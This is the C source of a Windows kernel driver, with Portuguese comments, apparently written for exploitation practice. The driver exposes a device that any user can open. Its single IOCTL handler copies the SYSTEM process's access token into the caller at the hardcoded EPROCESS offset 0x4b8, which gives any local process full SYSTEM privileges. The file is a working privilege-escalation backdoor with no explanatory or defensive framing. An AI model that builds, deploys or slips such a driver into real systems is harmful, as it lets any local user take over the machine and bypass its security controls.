#include <ntddk.h>

#define IOCTL_VULNERABLE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Nomes para o dispositivo e o link simbólico
UNICODE_STRING DEVICE_NAME = RTL_CONSTANT_STRING(L"\\Device\\VulnerableDriver");
UNICODE_STRING DEVICE_SYMBOLIC_NAME = RTL_CONSTANT_STRING(L"\\??\\VulnerableDriverLink");

// Função para descarregar o driver
void DriverUnload(PDRIVER_OBJECT DriverObject) {
    // Remover o link simbólico e o dispositivo
    IoDeleteSymbolicLink(&DEVICE_SYMBOLIC_NAME);
    IoDeleteDevice(DriverObject->DeviceObject);
    DbgPrint("Driver descarregado e recursos liberados.\n");
}

// Função para obter o processo SYSTEM
NTSTATUS GetSystemProcess(PEPROCESS* SystemProcess) {
    NTSTATUS status;
    HANDLE hSystemProcess;
    OBJECT_ATTRIBUTES objAttr;
    CLIENT_ID clientId;

    InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
    clientId.UniqueProcess = (HANDLE)4; // PID do SYSTEM
    clientId.UniqueThread = NULL;

    // Abrir o processo SYSTEM
    status = ZwOpenProcess(&hSystemProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    // Obter referência ao objeto do processo
    status = ObReferenceObjectByHandle(hSystemProcess, PROCESS_ALL_ACCESS, *PsProcessType, KernelMode, (PVOID*)SystemProcess, NULL);
    ZwClose(hSystemProcess);

    return status;
}

// Manipulador para o IOCTL
NTSTATUS IoControlHandler(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);

    PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;

    if (irpStack->Parameters.DeviceIoControl.IoControlCode == IOCTL_VULNERABLE) {
        __try {
            PEPROCESS currentProcess = PsGetCurrentProcess();
            PEPROCESS systemProcess;
            if (NT_SUCCESS(GetSystemProcess(&systemProcess))) {
                *(PACCESS_TOKEN*)((char*)currentProcess + 0x4b8) = *(PACCESS_TOKEN*)((char*)systemProcess + 0x4b8);
                ObDereferenceObject(systemProcess);
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            status = STATUS_UNSUCCESSFUL;
        }
    }
    else {
        status = STATUS_INVALID_DEVICE_REQUEST;
    }

    Irp->IoStatus.Status = status;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

NTSTATUS MajorFunctions(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);

    DbgPrint("IRP_MJ_CREATE recebido.\n");

    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}

// DriverEntry aprimorado
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);

    PDEVICE_OBJECT deviceObject;
    NTSTATUS status;

    // Criar o dispositivo
    status = IoCreateDevice(
        DriverObject,
        0,
        &DEVICE_NAME,
        FILE_DEVICE_UNKNOWN,
        0,
        FALSE,
        &deviceObject
    );

    if (!NT_SUCCESS(status)) {
        DbgPrint("Erro ao criar dispositivo: %08x\n", status);
        return status;
    }


    // Criar o link simbólico
    status = IoCreateSymbolicLink(&DEVICE_SYMBOLIC_NAME, &DEVICE_NAME);
    if (!NT_SUCCESS(status)) {
        DbgPrint("Erro ao criar link simbólico: %08x\n", status);
        IoDeleteDevice(deviceObject);
        return status;
    }

    DbgPrint("Dispositivo e link simbólico criados com sucesso.\n");

    // Configurar rotinas de IRP
    DriverObject->MajorFunction[IRP_MJ_CREATE] = MajorFunctions;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = MajorFunctions;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControlHandler;
    DriverObject->DriverUnload = DriverUnload;

    return STATUS_SUCCESS;
}
